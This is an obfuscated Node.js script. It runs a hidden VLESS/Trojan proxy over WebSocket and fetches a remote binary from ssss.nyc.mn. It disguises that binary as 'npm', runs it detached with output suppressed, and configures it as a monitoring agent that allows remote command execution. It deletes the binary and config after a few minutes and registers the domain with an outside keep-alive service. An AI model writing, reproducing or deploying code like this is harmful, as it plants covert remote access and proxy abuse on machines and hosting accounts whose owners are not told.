const _0x5f2cd2=_0x118e;(function(_0x4a9e50,_0x2235d2){const _0x5104e4=_0x118e,_0x555efc=_0x4a9e50();while(!![]){try{const _0x3d48bf=parseInt(_0x5104e4(0xfd))/0x1*(parseInt(_0x5104e4(0xbb))/0x2)+-parseInt(_0x5104e4(0xf4))/0x3*(parseInt(_0x5104e4(0xe7))/0x4)+parseInt(_0x5104e4(0xcc))/0x5+parseInt(_0x5104e4(0xa6))/0x6+-parseInt(_0x5104e4(0x90))/0x7+parseInt(_0x5104e4(0xd6))/0x8*(parseInt(_0x5104e4(0xae))/0x9)+parseInt(_0x5104e4(0x8b))/0xa*(-parseInt(_0x5104e4(0xcd))/0xb);if(_0x3d48bf===_0x2235d2)break;else _0x555efc['push'](_0x555efc['shift']());}catch(_0x631560){_0x555efc['push'](_0x555efc['shift']());}}}(_0x56e2,0xdcfa0));function _0x118e(_0x27edcd,_0x3a5dc2){const _0x56e2e7=_0x56e2();return _0x118e=function(_0x118e40,_0x59c358){_0x118e40=_0x118e40-0x85;let _0x42dba0=_0x56e2e7[_0x118e40];return _0x42dba0;},_0x118e(_0x27edcd,_0x3a5dc2);}const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x5f2cd2(0xac)),net=require(_0x5f2cd2(0xbd)),path=require(_0x5f2cd2(0x94)),crypto=require(_0x5f2cd2(0xf5)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x5f2cd2(0xc8)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5f2cd2(0x8d)][_0x5f2cd2(0x91)]||_0x5f2cd2(0x101),NEZHA_SERVER=process[_0x5f2cd2(0x8d)][_0x5f2cd2(0x92)]||'',NEZHA_PORT=process[_0x5f2cd2(0x8d)][_0x5f2cd2(0xb0)]||'',NEZHA_KEY=process['env'][_0x5f2cd2(0xea)]||'',DOMAIN=process[_0x5f2cd2(0x8d)][_0x5f2cd2(0x9b)]||_0x5f2cd2(0xa4),AUTO_ACCESS=process['env'][_0x5f2cd2(0xd1)]||!![],WSPATH=process['env'][_0x5f2cd2(0xf8)]||UUID[_0x5f2cd2(0xc6)](0x0,0x8),SUB_PATH=process[_0x5f2cd2(0x8d)][_0x5f2cd2(0xe2)]||_0x5f2cd2(0xc3),NAME=process['env']['NAME']||_0x5f2cd2(0xf3),PORT=process[_0x5f2cd2(0x8d)][_0x5f2cd2(0x9f)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5ac661=_0x5f2cd2;try{const _0x5e927a=await axios[_0x5ac661(0xb7)](_0x5ac661(0xd0)),_0x2b8209=_0x5e927a[_0x5ac661(0x88)];ISP=(_0x2b8209[_0x5ac661(0xb8)]+'-'+_0x2b8209['asOrganization'])[_0x5ac661(0xd4)](/ /g,'_');}catch(_0x43303b){ISP=_0x5ac661(0xfc);}};GetISP();const httpServer=http[_0x5f2cd2(0xda)]((_0xafe2d4,_0x2a39f3)=>{const _0x107731=_0x5f2cd2;if(_0xafe2d4[_0x107731(0x106)]==='/'){const _0x4a8ffc=path['join'](__dirname,_0x107731(0x99));fs[_0x107731(0xff)](_0x4a8ffc,'utf8',(_0x212460,_0x280867)=>{const _0x228c8b=_0x107731;if(_0x212460){_0x2a39f3[_0x228c8b(0x104)](0xc8,{'Content-Type':_0x228c8b(0xd2)}),_0x2a39f3['end'](_0x228c8b(0x89));return;}_0x2a39f3[_0x228c8b(0x104)](0xc8,{'Content-Type':_0x228c8b(0xd2)}),_0x2a39f3[_0x228c8b(0xf0)](_0x280867);});return;}else{if(_0xafe2d4[_0x107731(0x106)]==='/'+SUB_PATH){const _0x264075=_0x107731(0xb2)+UUID+'@'+DOMAIN+_0x107731(0xc2)+DOMAIN+_0x107731(0xbf)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x228c7d=_0x107731(0xde)+UUID+'@'+DOMAIN+_0x107731(0x100)+DOMAIN+_0x107731(0xbf)+DOMAIN+_0x107731(0xf6)+WSPATH+'#'+NAME+'-'+ISP,_0x4a0255=_0x264075+'\x0a'+_0x228c7d,_0x25e0da=Buffer[_0x107731(0xa7)](_0x4a0255)[_0x107731(0xc0)](_0x107731(0xec));_0x2a39f3['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x2a39f3['end'](_0x25e0da+'\x0a');}else _0x2a39f3[_0x107731(0x104)](0x194,{'Content-Type':_0x107731(0xe3)}),_0x2a39f3[_0x107731(0xf0)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x5f2cd2(0xd4)](/-/g,''),DNS_SERVERS=[_0x5f2cd2(0x97),'1.1.1.1'];function resolveHost(_0x5bd261){return new Promise((_0x50a8cf,_0x9046d5)=>{const _0x20b08b=_0x118e;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x20b08b(0xcb)](_0x5bd261)){_0x50a8cf(_0x5bd261);return;}let _0x295d04=0x0;function _0x31ac0d(){const _0x582a13=_0x20b08b;if(_0x295d04>=DNS_SERVERS[_0x582a13(0xb1)]){_0x9046d5(new Error(_0x582a13(0xdb)+_0x5bd261+_0x582a13(0xd9)));return;}const _0x17e798=DNS_SERVERS[_0x295d04];_0x295d04++;const _0x39efc2=_0x582a13(0xbe)+encodeURIComponent(_0x5bd261)+'&type=A';axios[_0x582a13(0xb7)](_0x39efc2,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x582a13(0xe8)](_0x312a76=>{const _0x39ab64=_0x582a13,_0x5bd51c=_0x312a76[_0x39ab64(0x88)];if(_0x5bd51c[_0x39ab64(0xeb)]===0x0&&_0x5bd51c[_0x39ab64(0xc1)]&&_0x5bd51c[_0x39ab64(0xc1)][_0x39ab64(0xb1)]>0x0){const _0x552490=_0x5bd51c[_0x39ab64(0xc1)][_0x39ab64(0xb4)](_0x3068b2=>_0x3068b2['type']===0x1);if(_0x552490){_0x50a8cf(_0x552490[_0x39ab64(0x88)]);return;}}_0x31ac0d();})['catch'](_0xc96a72=>{_0x31ac0d();});}_0x31ac0d();});}function _0x56e2(){const _0x523044=['createHash','client_secret:\x20','8.8.4.4','pipe','index.html','map','DOMAIN','npm','connect','\x20-p\x20','PORT','digest','/bin/bash','trim','update','1234.abc.com','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','7601970TIobjD','from','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','post','catch','utf-8','axios','npm\x20is\x20already\x20running,\x20skip\x20running...','9CaKkZU','substr','NEZHA_PORT','length','vless://','finish','find','config.yaml','pop','get','country','arch','2087','4HqUyUW','write','net','https://dns.google/resolve?name=','&fp=chrome&type=ws&host=','toString','Answer',':443?encryption=none&security=tls&sni=','sub','log','https://oooo.serv00.net/add-url','slice','hex','child_process','arm64','https://arm64.ssss.nyc.mn/v1','test','2518065gglrpw','2080133yLZYgQ','once','https://arm64.ssss.nyc.mn/agent','https://speed.cloudflare.com/meta','AUTO_ACCESS','text/html','setsid\x20nohup\x20./npm\x20-s\x20','replace','false','11483816jnvKdA','decode','send','\x20with\x20all\x20DNS\x20servers','createServer','Failed\x20to\x20resolve\x20','message','arm','trojan://','error:\x20','stream','unlink','SUB_PATH','text/plain','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','chmod\x20+x\x20npm','listen','5910164LUkueu','then','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','NEZHA_KEY','Status','base64','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','aarch64','end','https://','createWriteStream','Hug','3rGeIAL','crypto','&path=%2F','2096','WSPATH','npm\x20running\x20error:','readUInt16BE','2053','Unknown','480430MHdBYT','close','readFile',':443?security=tls&sni=','6c7f6e06-95f9-47cd-939e-bcbe0bb879d0','--tls','join','writeHead','npm\x20download\x20successfully','url','true','split','every','includes','443','data','Hello\x20world!','2083','80xyKeYI','https://amd64.ssss.nyc.mn/agent','env','error','readUInt8','1900220rfjBvV','UUID','NEZHA_SERVER','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','path'];_0x56e2=function(){return _0x523044;};return _0x56e2();}function handleVlessConnection(_0x5baf16,_0x1ed41d){const _0x1bc0b9=_0x5f2cd2,[_0x244fba]=_0x1ed41d,_0x241b4e=_0x1ed41d[_0x1bc0b9(0xc6)](0x1,0x11);if(!_0x241b4e[_0x1bc0b9(0x85)]((_0xcde629,_0x1cb2ea)=>_0xcde629==parseInt(uuid[_0x1bc0b9(0xaf)](_0x1cb2ea*0x2,0x2),0x10)))return![];let _0x32750e=_0x1ed41d[_0x1bc0b9(0xc6)](0x11,0x12)[_0x1bc0b9(0x8f)]()+0x13;const _0x362178=_0x1ed41d[_0x1bc0b9(0xc6)](_0x32750e,_0x32750e+=0x2)[_0x1bc0b9(0xfa)](0x0),_0x26e84d=_0x1ed41d['slice'](_0x32750e,_0x32750e+=0x1)[_0x1bc0b9(0x8f)](),_0x3ab5e7=_0x26e84d==0x1?_0x1ed41d['slice'](_0x32750e,_0x32750e+=0x4)['join']('.'):_0x26e84d==0x2?new TextDecoder()[_0x1bc0b9(0xd7)](_0x1ed41d['slice'](_0x32750e+0x1,_0x32750e+=0x1+_0x1ed41d[_0x1bc0b9(0xc6)](_0x32750e,_0x32750e+0x1)['readUInt8']())):_0x26e84d==0x3?_0x1ed41d[_0x1bc0b9(0xc6)](_0x32750e,_0x32750e+=0x10)['reduce']((_0x35a012,_0x5d80b6,_0x3b89fe,_0x5dbca0)=>_0x3b89fe%0x2?_0x35a012['concat'](_0x5dbca0[_0x1bc0b9(0xc6)](_0x3b89fe-0x1,_0x3b89fe+0x1)):_0x35a012,[])['map'](_0x7144cf=>_0x7144cf[_0x1bc0b9(0xfa)](0x0)[_0x1bc0b9(0xc0)](0x10))[_0x1bc0b9(0x103)](':'):'';_0x5baf16[_0x1bc0b9(0xd8)](new Uint8Array([_0x244fba,0x0]));const _0x44ed65=createWebSocketStream(_0x5baf16);return resolveHost(_0x3ab5e7)[_0x1bc0b9(0xe8)](_0xc58fcc=>{const _0x771e68=_0x1bc0b9;net[_0x771e68(0x9d)]({'host':_0xc58fcc,'port':_0x362178},function(){const _0x3046b4=_0x771e68;this[_0x3046b4(0xbc)](_0x1ed41d[_0x3046b4(0xc6)](_0x32750e)),_0x44ed65['on'](_0x3046b4(0x8e),()=>{})[_0x3046b4(0x98)](this)['on'](_0x3046b4(0x8e),()=>{})[_0x3046b4(0x98)](_0x44ed65);})['on'](_0x771e68(0x8e),()=>{});})[_0x1bc0b9(0xaa)](_0x378f22=>{const _0x349cda=_0x1bc0b9;net[_0x349cda(0x9d)]({'host':_0x3ab5e7,'port':_0x362178},function(){const _0x24a11e=_0x349cda;this[_0x24a11e(0xbc)](_0x1ed41d['slice'](_0x32750e)),_0x44ed65['on'](_0x24a11e(0x8e),()=>{})[_0x24a11e(0x98)](this)['on'](_0x24a11e(0x8e),()=>{})[_0x24a11e(0x98)](_0x44ed65);})['on'](_0x349cda(0x8e),()=>{});}),!![];}function handleTrojanConnection(_0x13c14a,_0x533d57){const _0x585271=_0x5f2cd2;try{if(_0x533d57[_0x585271(0xb1)]<0x3a)return![];const _0x5af86f=_0x533d57['slice'](0x0,0x38)['toString'](),_0x16b58c=[UUID];let _0x17a25d=null;for(const _0x56fad5 of _0x16b58c){const _0x4bff51=crypto[_0x585271(0x95)]('sha224')[_0x585271(0xa3)](_0x56fad5)[_0x585271(0xa0)](_0x585271(0xc7));if(_0x4bff51===_0x5af86f){_0x17a25d=_0x56fad5;break;}}if(!_0x17a25d)return![];let _0x74b2c2=0x38;_0x533d57[_0x74b2c2]===0xd&&_0x533d57[_0x74b2c2+0x1]===0xa&&(_0x74b2c2+=0x2);const _0x409f87=_0x533d57[_0x74b2c2];if(_0x409f87!==0x1)return![];_0x74b2c2+=0x1;const _0x558e16=_0x533d57[_0x74b2c2];_0x74b2c2+=0x1;let _0x46e918,_0x1f529c;if(_0x558e16===0x1)_0x46e918=_0x533d57[_0x585271(0xc6)](_0x74b2c2,_0x74b2c2+0x4)[_0x585271(0x103)]('.'),_0x74b2c2+=0x4;else{if(_0x558e16===0x3){const _0x27a9c2=_0x533d57[_0x74b2c2];_0x74b2c2+=0x1,_0x46e918=_0x533d57['slice'](_0x74b2c2,_0x74b2c2+_0x27a9c2)['toString'](),_0x74b2c2+=_0x27a9c2;}else{if(_0x558e16===0x4)_0x46e918=_0x533d57['slice'](_0x74b2c2,_0x74b2c2+0x10)['reduce']((_0xf01146,_0x3b7c44,_0x46f61a,_0x3227db)=>_0x46f61a%0x2?_0xf01146['concat'](_0x3227db[_0x585271(0xc6)](_0x46f61a-0x1,_0x46f61a+0x1)):_0xf01146,[])[_0x585271(0x9a)](_0x4ae601=>_0x4ae601[_0x585271(0xfa)](0x0)[_0x585271(0xc0)](0x10))['join'](':'),_0x74b2c2+=0x10;else return![];}}_0x1f529c=_0x533d57[_0x585271(0xfa)](_0x74b2c2),_0x74b2c2+=0x2;_0x74b2c2<_0x533d57[_0x585271(0xb1)]&&_0x533d57[_0x74b2c2]===0xd&&_0x533d57[_0x74b2c2+0x1]===0xa&&(_0x74b2c2+=0x2);const _0x214774=createWebSocketStream(_0x13c14a);return resolveHost(_0x46e918)[_0x585271(0xe8)](_0x52bbc1=>{const _0x52e15d=_0x585271;net[_0x52e15d(0x9d)]({'host':_0x52bbc1,'port':_0x1f529c},function(){const _0x211936=_0x52e15d;_0x74b2c2<_0x533d57[_0x211936(0xb1)]&&this[_0x211936(0xbc)](_0x533d57[_0x211936(0xc6)](_0x74b2c2)),_0x214774['on'](_0x211936(0x8e),()=>{})[_0x211936(0x98)](this)['on'](_0x211936(0x8e),()=>{})['pipe'](_0x214774);})['on'](_0x52e15d(0x8e),()=>{});})['catch'](_0x34d89f=>{const _0x1878f3=_0x585271;net[_0x1878f3(0x9d)]({'host':_0x46e918,'port':_0x1f529c},function(){const _0x1d75a5=_0x1878f3;_0x74b2c2<_0x533d57[_0x1d75a5(0xb1)]&&this['write'](_0x533d57[_0x1d75a5(0xc6)](_0x74b2c2)),_0x214774['on'](_0x1d75a5(0x8e),()=>{})[_0x1d75a5(0x98)](this)['on'](_0x1d75a5(0x8e),()=>{})['pipe'](_0x214774);})['on']('error',()=>{});}),!![];}catch(_0x2ecdf6){return![];}}wss['on']('connection',(_0x24a08b,_0x46aa47)=>{const _0xdbba73=_0x5f2cd2,_0x4c234b=_0x46aa47['url']||'';_0x24a08b[_0xdbba73(0xce)](_0xdbba73(0xdc),_0xa9c577=>{const _0x594476=_0xdbba73;if(_0xa9c577[_0x594476(0xb1)]>0x11&&_0xa9c577[0x0]===0x0){const _0x4e9e42=_0xa9c577[_0x594476(0xc6)](0x1,0x11),_0x574647=_0x4e9e42[_0x594476(0x85)]((_0x2f67a4,_0x2fc3cc)=>_0x2f67a4==parseInt(uuid[_0x594476(0xaf)](_0x2fc3cc*0x2,0x2),0x10));if(_0x574647){!handleVlessConnection(_0x24a08b,_0xa9c577)&&_0x24a08b['close']();return;}}!handleTrojanConnection(_0x24a08b,_0xa9c577)&&_0x24a08b[_0x594476(0xfe)]();})['on'](_0xdbba73(0x8e),()=>{});});const getDownloadUrl=()=>{const _0x23cc2d=_0x5f2cd2,_0x258ee3=os[_0x23cc2d(0xb9)]();return _0x258ee3===_0x23cc2d(0xdd)||_0x258ee3===_0x23cc2d(0xc9)||_0x258ee3===_0x23cc2d(0xef)?!NEZHA_PORT?_0x23cc2d(0xca):_0x23cc2d(0xcf):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x23cc2d(0x8c);},downloadFile=async()=>{const _0x56e43a=_0x5f2cd2;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2d37eb=getDownloadUrl(),_0x5e4733=await axios({'method':_0x56e43a(0xb7),'url':_0x2d37eb,'responseType':_0x56e43a(0xe0)}),_0x39314c=fs[_0x56e43a(0xf2)](_0x56e43a(0x9c));return _0x5e4733['data']['pipe'](_0x39314c),new Promise((_0x19f893,_0x500e02)=>{const _0x1ba2e7=_0x56e43a;_0x39314c['on'](_0x1ba2e7(0xb3),()=>{const _0x363ad8=_0x1ba2e7;console[_0x363ad8(0xc4)](_0x363ad8(0x105)),exec(_0x363ad8(0xe5),_0x3b32aa=>{if(_0x3b32aa)_0x500e02(_0x3b32aa);_0x19f893();});}),_0x39314c['on'](_0x1ba2e7(0x8e),_0x500e02);});}catch(_0x3bef38){throw _0x3bef38;}},runnz=async()=>{const _0x2cd3c4=_0x5f2cd2;try{const _0xb25de5=execSync(_0x2cd3c4(0x93),{'encoding':_0x2cd3c4(0xab)});if(_0xb25de5[_0x2cd3c4(0xa2)]()!==''){console['log'](_0x2cd3c4(0xad));return;}}catch(_0x2aac6c){}await downloadFile();let _0x402bb4='',_0xc4ea1e=[_0x2cd3c4(0x87),'8443',_0x2cd3c4(0xf7),_0x2cd3c4(0xba),_0x2cd3c4(0x8a),_0x2cd3c4(0xfb)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x55ea8a=_0xc4ea1e[_0x2cd3c4(0x86)](NEZHA_PORT)?_0x2cd3c4(0x102):'';_0x402bb4=_0x2cd3c4(0xd3)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2cd3c4(0x9e)+NEZHA_KEY+'\x20'+_0x55ea8a+_0x2cd3c4(0xed);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x141456=NEZHA_SERVER[_0x2cd3c4(0x86)](':')?NEZHA_SERVER[_0x2cd3c4(0x108)](':')[_0x2cd3c4(0xb6)]():'',_0x18fab0=_0xc4ea1e[_0x2cd3c4(0x86)](_0x141456)?_0x2cd3c4(0x107):_0x2cd3c4(0xd5),_0xa2a062=_0x2cd3c4(0x96)+NEZHA_KEY+_0x2cd3c4(0xa5)+NEZHA_SERVER+_0x2cd3c4(0xee)+_0x18fab0+_0x2cd3c4(0xe9)+UUID;fs['writeFileSync'](_0x2cd3c4(0xb5),_0xa2a062);}_0x402bb4=_0x2cd3c4(0xa8);}else{console[_0x2cd3c4(0xc4)](_0x2cd3c4(0xe4));return;}}try{exec(_0x402bb4,{'shell':_0x2cd3c4(0xa1)},_0x4e3471=>{const _0x111db3=_0x2cd3c4;if(_0x4e3471)console[_0x111db3(0x8e)](_0x111db3(0xf9),_0x4e3471);else console['log']('npm\x20is\x20running');});}catch(_0x2d5783){console[_0x2cd3c4(0x8e)](_0x2cd3c4(0xdf)+_0x2d5783);}};async function addAccessTask(){const _0x9b7747=_0x5f2cd2;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1cf220=_0x9b7747(0xf1)+DOMAIN;try{const _0x5de5de=await axios[_0x9b7747(0xa9)](_0x9b7747(0xc5),{'url':_0x1cf220},{'headers':{'Content-Type':'application/json'}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x3d2d9c){}}const delFiles=()=>{const _0x18312c=_0x5f2cd2;fs[_0x18312c(0xe1)](_0x18312c(0x9c),()=>{}),fs[_0x18312c(0xe1)](_0x18312c(0xb5),()=>{});};httpServer[_0x5f2cd2(0xe6)](PORT,()=>{const _0x29228e=_0x5f2cd2;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x29228e(0xc4)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
